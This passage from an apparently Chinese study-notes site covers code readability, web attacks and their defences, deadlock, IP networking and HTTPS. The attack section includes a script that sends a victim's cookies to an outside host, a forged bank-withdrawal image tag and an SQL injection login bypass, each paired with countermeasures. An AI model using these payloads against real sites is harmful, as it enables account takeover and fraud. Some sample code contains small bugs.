等做标记：\n标记 用法 TODO 待做 FIXME 待修复 HACK 粗糙的解决方案 XXX 危险！这里有重要的问题 六、如何编写注释 # 尽量简洁明了：\n// The first String is student\u0026#39;s name // The Second Integer is student\u0026#39;s score Map\u0026lt;String, Integer\u0026gt; scoreMap = new HashMap\u0026lt;\u0026gt;(); // Student\u0026#39;s name -\u0026gt; Student\u0026#39;s score Map\u0026lt;String, Integer\u0026gt; scoreMap = new HashMap\u0026lt;\u0026gt;(); 添加测试用例来说明：\n// ... // Example: add(1, 2), return 3 int add(int x, int y) { return x + y; } 使用专业名词来缩短概念上的解释，比如用设计模式名来说明代码。\n七、提高控制流的可读性 # 条件表达式中，左侧是变量，右侧是常数。比如下面第一个语句正确：\nif (len \u0026lt; 10) if (10 \u0026gt; len) 只有在逻辑简单的情况下使用 ? : 三目运算符来使代码更紧凑，否则应该拆分成 if / else；\ndo / while 的条件放在后面，不够简单明了，并且会有一些迷惑的地方，最好使用 while 来代替。\n如果只有一个 goto 目标，那么 goto 尚且还能接受，但是过于复杂的 goto 会让代码可读性特别差，应该避免使用 goto。\n在嵌套的循环中，用一些 return 语句往往能减少嵌套的层数。\n八、拆分长表达式 # 长表达式的可读性很差，可以引入一些解释变量从而拆分表达式：\nif line.split(\u0026#39;:\u0026#39;)[0].strip() == \u0026#34;root\u0026#34;: ... username = line.split(\u0026#39;:\u0026#39;)[0].strip() if username == \u0026#34;root\u0026#34;: ... 使用摩根定理简化一些逻辑表达式：\nif (!a \u0026amp;\u0026amp; !b) { ... } if (!(a || b)) { ... } 九、变量与可读性 # 去除控制流变量 。在循环中通过使用 break 或者 return 可以减少控制流变量的使用。\nboolean done = false; while (/* condition */ \u0026amp;\u0026amp; !done) { ... if ( ... ) { done = true; continue; } } while(/* condition */) { ... if ( ... ) { break; } } 减小变量作用域 。作用域越小，越容易定位到变量所有使用的地方。\nJavaScript 可以用闭包减小作用域。以下代码中 submit_form 是函数变量，submitted 变量控制函数不会被提交两次。第一个实现中 submitted 是全局变量，第二个实现把 submitted 放到匿名函数中，从而限制了起作用域范围。\nsubmitted = false; var submit_form = function(form_name) { if (submitted) { return; } submitted = true; }; var submit_form = (function() { var submitted = false; return function(form_name) { if(submitted) { return; } submitted = true; } }()); // () 使得外层匿名函数立即执行 JavaScript 中没有用 var 声明的变量都是全局变量，而全局变量很容易造成迷惑，因此应当总是用 var 来声明变量。\n变量定义的位置应当离它使用的位置最近。\n实例解析\n在一个网页中有以下文本输入字段：\n\u0026lt;input type = \u0026#34;text\u0026#34; id = \u0026#34;input1\u0026#34; value = \u0026#34;a\u0026#34;\u0026gt; \u0026lt;input type = \u0026#34;text\u0026#34; id = \u0026#34;input2\u0026#34; value = \u0026#34;b\u0026#34;\u0026gt; \u0026lt;input type = \u0026#34;text\u0026#34; id = \u0026#34;input3\u0026#34; value = \u0026#34;\u0026#34;\u0026gt; \u0026lt;input type = \u0026#34;text\u0026#34; id = \u0026#34;input4\u0026#34; value = \u0026#34;d\u0026#34;\u0026gt; 现在要接受一个字符串并把它放到第一个空的 input 字段中，初始实现如下：\nvar setFirstEmptyInput = function(new_alue) { var found = false; var i = 1; var elem = document.getElementById(\u0026#39;input\u0026#39; + i); while (elem != null) { if (elem.value === \u0026#39;\u0026#39;) { found = true; break; } i++; elem = document.getElementById(\u0026#39;input\u0026#39; + i); } if (found) elem.value = new_value; return elem; } 以上实现有以下问题：\nfound 可以去除； elem 作用域过大； 可以用 for 循环代替 while 循环； var setFirstEmptyInput = function(new_value) { for (var i = 1; true; i++) { var elem = document.getElementById(\u0026#39;input\u0026#39; + i); if (elem === null) { return null; } if (elem.value === \u0026#39;\u0026#39;) { elem.value = new_value; return elem; } } }; 十、抽取函数 # 工程学就是把大问题拆分成小问题再把这些问题的解决方案放回一起。\n首先应该明确一个函数的高层次目标，然后对于不是直接为了这个目标工作的代码，抽取出来放到独立的函数中。\n介绍性的代码：\nint findClostElement(int[] arr) { int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i \u0026lt; arr.length; i++) { int x = ...; int y = ...; int z = ...; int value = x * y * z; int dist = Math.sqrt(Math.pow(value, 2), Math.pow(arr[i], 2)); if (dist \u0026lt; clostDist) { clostIdx = i; clostDist = value; } } return clostIdx; } 以上代码中循环部分主要计算距离，这部分不属于代码高层次目标，高层次目标是寻找最小距离的值，因此可以把这部分代替提取到独立的函数中。这样做也带来一个额外的好处有：可以单独进行测试、可以快速找到程序错误并修改。\npublic int findClostElement(int[] arr) { int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i \u0026lt; arr.length; i++) { int dist = computDist(arr, i); if (dist \u0026lt; clostDist) { clostIdx = i; clostDist = value; } } return clostIdx; } 并不是函数抽取的越多越好，如果抽取过多，在阅读代码的时候可能需要不断跳来跳去。只有在当前函数不需要去了解某一块代码细节而能够表达其内容时，把这块代码抽取成子函数才是好的。\n函数抽取也用于减小代码的冗余。\n十一、一次只做一件事 # 只做一件事的代码很容易让人知道其要做的事；\n基本流程：列出代码所做的所有任务；把每个任务拆分到不同的函数，或者不同的段落。\n十二、用自然语言表述代码 # 先用自然语言书写代码逻辑，也就是伪代码，然后再写代码，这样代码逻辑会更清晰。\n十三、减少代码量 # 不要过度设计，编码过程会有很多变化，过度设计的内容到最后往往是无用的。\n多用标准库实现。\n"},{"id":24,"href":"/keeplearning/docs/system-design/attack/","title":"攻击技术","section":"系统设计","content":" 攻击技术 # 一、跨站脚本攻击 # 概念 # 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。\n攻击原理 # 例如有一个论坛网站，攻击者可以在上面发布以下内容：\n\u0026lt;script\u0026gt;location.href = \u0026#34;//domain.com/?c=\u0026#34; + document.cookie\u0026lt;/script\u0026gt; 之后该内容可能会被渲染成以下形式：\n\u0026lt;p\u0026gt; \u0026lt;script\u0026gt;location.href = \u0026#34;//domain.com/?c=\u0026#34; + document.cookie\u0026lt;/script\u0026gt; \u0026lt;/p\u0026gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。\n危害 # 窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 防范手段 # 1. 设置 Cookie 为 HttpOnly # 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。\n2. 过滤特殊字符 # 例如将 \u0026lt; 转义为 \u0026amp;lt;，将 \u0026gt; 转义为 \u0026amp;gt;，从而避免 HTML 和 Jascript 代码的运行。\n富文本编辑器允许用户输入 HTML 代码，就不能简单地将 \u0026lt; 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。\n富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。\n以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。\n\u0026lt;h1 id=\u0026#34;title\u0026#34;\u0026gt;XSS Demo\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;123\u0026lt;/p\u0026gt; \u0026lt;form\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;q\u0026#34; value=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt;hello\u0026lt;/pre\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; alert(/xss/); \u0026lt;/script\u0026gt; \u0026lt;h1\u0026gt;XSS Demo\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;123\u0026lt;/p\u0026gt; \u0026amp;lt;form\u0026amp;gt; \u0026amp;lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;q\u0026#34; value=\u0026#34;test\u0026#34;\u0026amp;gt; \u0026amp;lt;/form\u0026amp;gt; \u0026lt;pre\u0026gt;hello\u0026lt;/pre\u0026gt; \u0026amp;lt;script type=\u0026#34;text/javascript\u0026#34;\u0026amp;gt; alert(/xss/); \u0026amp;lt;/script\u0026amp;gt; XSS 过滤在线测试\n二、跨站请求伪造 # 概念 # 跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。\nXSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。\n攻击原理 # 假如一家银行用以执行转账操作的 URL 地址如下：\nhttp://www.examplebank.com/withdraw?account=AccoutName\u0026amp;amount=1000\u0026amp;for=PayeeName。 那么，一个恶意攻击者可以在另一个网站上放置如下代码：\n\u0026lt;img src=\u0026#34;http://www.examplebank.com/withdraw?account=Alice\u0026amp;amount=1000\u0026amp;for=Badman\u0026#34;\u0026gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。\n这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。\n通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。\n防范手段 # 1. 检查 Referer 首部字段 # Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。\n这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。\n2. 添加校验 Token # 在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。\n3. 输入验证码 # 因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。\n三、SQL 注入攻击 # 概念 # 服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。\n攻击原理 # 例如一个网站登录验证的 SQL 查询代码为：\nstrSQL = \u0026#34;SELECT * FROM users WHERE (name = \u0026#39;\u0026#34; + userName + \u0026#34;\u0026#39;) and (pw = \u0026#39;\u0026#34;+ passWord +\u0026#34;\u0026#39;);\u0026#34; 如果填入以下内容：\nuserName = \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;; passWord = \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;; 那么 SQL 查询字符串为：\nstrSQL = \u0026#34;SELECT * FROM users WHERE (name = \u0026#39;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;) and (pw = \u0026#39;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;);\u0026#34; 此时无需验证通过就能执行以下查询：\nstrSQL = \u0026#34;SELECT * FROM users;\u0026#34; 防范手段 # 1. 使用参数化查询 # Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。\nPreparedStatement stmt = connection.prepareStatement(\u0026#34;SELECT * FROM users WHERE userid=? AND password=?\u0026#34;); stmt.setString(1, userid); stmt.setString(2, password); ResultSet rs = stmt.executeQuery(); 2. 单引号转换 # 将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。\n四、拒绝服务攻击 # 拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。\n分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。\n参考资料 # 维基百科：跨站脚本 维基百科：SQL 注入攻击 维基百科：跨站点请求伪造 维基百科：拒绝服务攻击 "},{"id":25,"href":"/keeplearning/docs/os/deadlock/","title":"死锁","section":"操作系统","content":" 死锁 # 必要条件 # 互斥：每个资源要么已经分配给了一个进程，要么就是可用的。 占有和等待：已经得到了某个资源的进程可以再请求新的资源。 不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。 环路等待：有两个或者两个以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源。 处理方法 # 主要有以下四种方法：\n鸵鸟策略 死锁检测与死锁恢复 死锁预防 死锁避免 鸵鸟策略 # 把头埋在沙子里，假装根本没发生问题。\n因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。\n当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。\n大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。\n死锁检测与死锁恢复 # 不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。\n1. 每种类型一个资源的死锁检测 # 上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。\n图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。\n每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。\n2. 每种类型多个资源的死锁检测 # 上图中，有三个进程四个资源，每个数据代表的含义如下：\nE 向量：资源总量 A 向量：资源剩余量 C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量 R 矩阵：每个进程请求的资源数量 进程 P1 和 P2 所请求的资源都得不到满足，只有进程 P3 可以，让 P3 执行，之后释放 P3 拥有的资源，此时 A = (2 2 2 0)。P2 可以执行，执行后释放 P2 拥有的资源，A = (4 2 2 1) 。P1 也可以执行。所有进程都可以顺利执行，没有死锁。\n算法总结如下：\n每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。\n寻找一个没有标记的进程 Pi，它所请求的资源小于等于 A。 如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。 如果没有这样一个进程，算法终止。 3. 死锁恢复 # 利用抢占恢复 利用回滚恢复 通过杀死进程恢复 死锁预防 # 在程序运行之前预防发生死锁。\n1. 破坏互斥条件 # 例如假脱机打印机技术允许若干个进程同时输出，唯一真正请求物理打印机的进程是打印机守护进程。\n2. 破坏占有和等待条件 # 一种实现方式是规定所有进程在开始执行前请求所需要的全部资源。\n3. 破坏不可抢占条件 # 4. 破坏环路等待 # 给资源统一编号，进程只能按编号顺序来请求资源。\n死锁避免 # 在程序运行时避免发生死锁。\n1. 安全状态 # 图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。\n定义：如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则称该状态是安全的。\n安全状态的检测与死锁的检测类似，因为安全状态必须要求不能发生死锁。下面的银行家算法与死锁检测算法非常类似，可以结合着做参考对比。\n2. 单个资源的银行家算法 # 一个小城镇的银行家，他向一群客户分别承诺了一定的贷款额度，算法要做的是判断对请求的满足是否会进入不安全状态，如果是，就拒绝请求；否则予以分配。\n上图 c 为不安全状态，因此算法会拒绝之前的请求，从而避免进入图 c 中的状态。\n3. 多个资源的银行家算法 # 上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。\n检查一个状态是否安全的算法如下：\n查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。 假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。 重复以上两步，直到所有进程都标记为终止，则状态时安全的。 如果一个状态不是安全的，需要拒绝进入这个状态。\n"},{"id":26,"href":"/keeplearning/docs/network/network-layer/","title":"网络层","section":"网络","content":" 网络层 # 概述 # 因为网络层是整个互联网的核心，因此应当让网络层尽可能简单。网络层向上只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。\n使用 IP 协议，可以把异构的物理网络连接起来，使得在网络层看起来好像是一个统一的网络。\n与 IP 协议配套使用的还有三个协议：\n地址解析协议 ARP（Address Resolution Protocol） 网际控制报文协议 ICMP（Internet Control Message Protocol） 网际组管理协议 IGMP（Internet Group Management Protocol） IP 数据报格式 # 版本 : 有 4（IPv4）和 6（IPv6）两个值；\n首部长度 占 4 位，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为固定部分长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的填充部分来填充。 区分服务 : 用来获得更好的服务，一般情况下不使用。\n总长度 : 包括首部长度和数据部分长度。\n生存时间 ：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器跳数为单位，当 TTL 为 0 时就丢弃数据报。\n协议 ：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP 等。\n首部检验和 ：因为数据报每经过一个路由器，都要重新计算检验和，因此检验和不包含数据部分可以减少计算的工作量。\n标识 : 在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。\n片偏移 : 和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。\nIP 地址编址方式 # IP 地址的编址方式经历了三个历史阶段：\n分类 子网划分 无分类 1. 分类 # 由两部分组成，网络号和主机号，其中不同分类具有不同的网络号长度，并且是固定的。\nIP 地址 ::= {\u0026lt; 网络号 \u0026gt;, \u0026lt; 主机号 \u0026gt;}\n2. 子网划分 # 通过在主机号字段中拿一部分作为子网号，把两级 IP 地址划分为三级 IP 地址。\nIP 地址 ::= {\u0026lt; 网络号 \u0026gt;, \u0026lt; 子网号 \u0026gt;, \u0026lt; 主机号 \u0026gt;}\n要使用子网，必须配置子网掩码。一个 B 类地址的默认子网掩码为 255.255.0.0，如果 B 类地址的子网占两个比特，那么子网掩码为 11111111 11111111 11000000 00000000，也就是 255.255.192.0。\n注意，外部网络看不到子网的存在。\n3. 无分类 # 无分类编址 CIDR 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用网络前缀和主机号来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。\nIP 地址 ::= {\u0026lt; 网络前缀号 \u0026gt;, \u0026lt; 主机号 \u0026gt;}\nCIDR 的记法上采用在 IP 地址后面加上网络前缀长度的方法，例如 128.14.35.7/20 表示前 20 位为网络前缀。\nCIDR 的地址掩码可以继续称为子网掩码，子网掩码首 1 长度为网络前缀的长度。\n一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的很多个网络，并且在路由表中只需要一个路由就可以代替原来的多个路由，减少了路由表项的数量。把这种通过使用网络前缀来减少路由表项的方式称为路由聚合，也称为 构成超网 。\n在路由表中的项目由“网络前缀”和“下一跳地址”组成，在查找时可能会得到不止一个匹配结果，应当采用最长前缀匹配来确定应该匹配哪一个。\n地址解析协议 ARP # 网络层实现主机之间的通信，而链路层实现具体每段链路之间的通信。因此在通信过程中，IP 数据报的源地址和目的地址始终不变，而 MAC 地址随着链路的改变而改变。\nARP 实现由 IP 地址得到 MAC 地址。\n每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到 MAC 地址的映射表。\n如果主机 A 知道主机 B 的 IP 地址，但是 ARP 高速缓存中没有该 IP 地址到 MAC 地址的映射，此时主机 A 通过广播的方式发送 ARP 请求分组，主机 B 收到该请求后会发送 ARP 响应分组给主机 A 告知其 MAC 地址，随后主机 A 向其高速缓存中写入主机 B 的 IP 地址到 MAC 地址的映射。\n网际控制报文协议 ICMP # ICMP 是为了更有效地转发 IP 数据报和提高交付成功的机会。它封装在 IP 数据报中，但是不属于高层协议。\nICMP 报文分为差错报告报文和询问报文。\n1. Ping # Ping 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。\nPing 的原理是通过向目的主机发送 ICMP Echo 请求报文，目的主机收到之后会发送 Echo 回答报文。Ping 会根据时间和成功响应的次数估算出数据包往返时间以及丢包率。\n2. Traceroute # Traceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。\nTraceroute 发送的 IP 数据报封装的是无法交付的 UDP 用户数据报，并由目的主机发送终点不可达差错报告报文。\n源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，当 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文； 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。 虚拟专用网 VPN # 由于 IP 地址的紧缺，一个机构能申请到的 IP 地址数往往远小于本机构所拥有的主机数。并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的 IP 地址（专用地址）。\n有三个专用地址块：\n10.0.0.0 ~ 10.255.255.255 172.16.0.0 ~ 172.31.255.255 192.168.0.0 ~ 192.168.255.255 VPN 使用公用的互联网作为本机构各专用网之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指好像是，而实际上并不是，它有经过公用的互联网。\n下图中，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 10.1.0.1，目的地址是 10.2.0.3。数据报先发送到与互联网相连的路由器 R1，R1 对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址 125.1.2.3，目的地址是路由器 R2 的全球地址 194.4.5.6。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为 10.2.0.3，就交付给 Y。\n网络地址转换 NAT # 专用网内部的主机使用本地 IP 地址又想和互联网上的主机通信时，可以使用 NAT 来将本地 IP 转换为全球 IP。\n在以前，NAT 将本地 IP 和全球 IP 一一对应，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把传输层的端口号也用上了，使得多个专用网内部的主机共用一个全球 IP 地址。使用端口号的 NAT 也叫做网络地址与端口转换 NAPT。\n路由器的结构 # 路由器从功能上可以划分为：路由选择和分组转发。\n分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。\n路由器分组转发流程 # 从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。 若 N 就是与此路由器直接相连的某个网络地址，则进行直接交付； 若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给表中所指明的下一跳路由器； 若路由表中有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器； 若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器； 报告转发分组出错。 路由选择协议 # 路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。\n互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。\n可以把路由选择协议划分为两大类：\n自治系统内部的路由选择：RIP 和 OSPF 自治系统间的路由选择：BGP 1. 内部网关协议 RIP # RIP 是一种基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1。跳数最多为 15，超过 15 表示不可达。\nRIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。\n距离向量算法：\n对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1； 对修改后的 RIP 报文中的每一个项目，进行以下步骤： 若原来的路由表中没有目的网络 N，则把该项目添加到路由表中； 否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。 若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。 RIP 协议实现简单，开销小。但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。\n2. 内部网关协议 OSPF # 开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。\n开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。\nOSPF 具有以下特点：\n向本自治系统中的所有路由器发送信息，这种方法是洪泛法。 发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。 只有当链路状态发生变化时，路由器才会发送信息。 所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，OSPF 的更新过程收敛的很快。\n3. 外部网关协议 BGP # BGP（Border Gateway Protocol，边界网关协议）\nAS 之间的路由选择很困难，主要是由于：\n互联网规模很大； 各个 AS 内部使用不同的路由选择协议，无法准确定义路径的度量； AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。 BGP 只能寻找一条比较好的路由，而不是最佳路由。\n每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。\n"},{"id":27,"href":"/keeplearning/docs/http/http3/","title":"HTTP（三）","section":"HTTP","content":" HTTP（三） # 通信数据转发 # 1. 代理 # 代理服务器接受客户端的请求，并且转发给其它服务器。\n使用代理的主要目的是：\n缓存 负载均衡 网络访问控制 访问日志记录 代理服务器分为正向代理和反向代理两种：\n用户察觉得到正向代理的存在。 而反向代理一般位于内部网络中，用户察觉不到。 2. 网关 # 与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。\n3. 隧道 # 使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。\nHTTPS # HTTP 有以下安全性问题：\n使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。 HTTPS 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信，也就是说 HTTPS 使用了隧道进行通信。\n通过使用 SSL，HTTPS 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。\n加密 # 1. 对称密钥加密 # 对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。\n优点：运算速度快； 缺点：无法安全地将密钥传输给通信方。 2.非对称密钥加密 # 非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。\n公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。\n非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。\n优点：可以更安全地将公开密钥传输给通信发送方； 缺点：运算速度慢。 3. HTTPS 采用的加密方式 # 上面提到对称密钥加密方式的传输效率更高，但是无法安全地将密钥 Secret Key 传输给通信方。而非对称密钥加密方式可以保证传输的安全性，因此我们可以利用非对称密钥加密方式将 Secret Key 传输给通信方。HTTPS 采用混合的加密机制，正是利用了上面提到的方案：\n使用非对称密钥加密方式，传输对称密钥加密方式所需要的 Secret Key，从而保证安全性; 获取到 Secret Key 后，再使用对称密钥加密方式进行通信，从而保证效率。（下图中的 Session Key 就是 Secret Key） 认证 # 通过使用 证书 来对通信方进行认证。\n数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。\n服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。\n进行 HTTPS 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。\n完整性保护 # SSL 提供报文摘要功能来进行完整性保护。\nHTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。\nHTTPS 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。\nHTTPS 的缺点 # 